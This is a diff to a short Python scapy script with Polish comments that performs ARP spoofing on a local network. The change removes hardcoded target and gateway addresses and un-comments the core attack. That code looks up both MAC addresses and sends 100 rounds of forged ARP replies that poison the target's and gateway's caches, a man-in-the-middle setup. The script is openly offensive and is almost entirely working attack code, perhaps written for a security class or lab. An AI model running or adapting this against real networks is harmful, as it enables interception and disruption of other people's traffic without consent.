@@ -5,8 +5,7 @@ from scapy.all import *
 # wymagany docelowy adres IP i adres IP gatewaya
 from scapy.layers.l2 import Ether, ARP
 
-targetip = '192.168.1.164'  # wpisz jakiś swój ip adres, który istnieje
-gatewayip = '192.168.1.1'
+#
 
 
 def getMACAddress(targetip):
@@ -19,18 +18,17 @@ def sendspoofedreply(targetip, targetmac, sourceip): # wysyłamy odpowiedzi ze z
     spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
     send(spoofed, verbose=False)
 
-def main_function(targetIP, gatewayIP):
-    # targetMAC = getMACAddress(targetip)
+def main_function(targetip, gatewayip):
+    targetMAC = getMACAddress(targetip)
 
-    # gatewayMAC = getMACAddress(gatewayip)
+    gatewayMAC = getMACAddress(gatewayip)
 
 
     # # spoofing
-    # try:
-    #     for i in range(100):
-    #         sendspoofedreply(targetip, targetMAC, gatewayip)
-    #         sendspoofedreply(gatewayip, gatewayMAC, targetip)
-    # except KeyboardInterrupt:
-    #     print('Stop spoofing')
-    # return 'Spoofing done-> \nTarget MAC: ', targetMAC, ' \n Gateway MAC: ', gatewayMAC
-    return 'Spoofing finished; targetIP: ' + targetIP + ' gatewayIP:' + gatewayIP 
+    try:
+        for i in range(100):
+            sendspoofedreply(targetip, targetMAC, gatewayip)
+            sendspoofedreply(gatewayip, gatewayMAC, targetip)
+    except KeyboardInterrupt:
+        print('Stop spoofing')
+    return 'Spoofing done-> \nTarget MAC: ', targetMAC, ' \n Gateway MAC: ', gatewayMAC
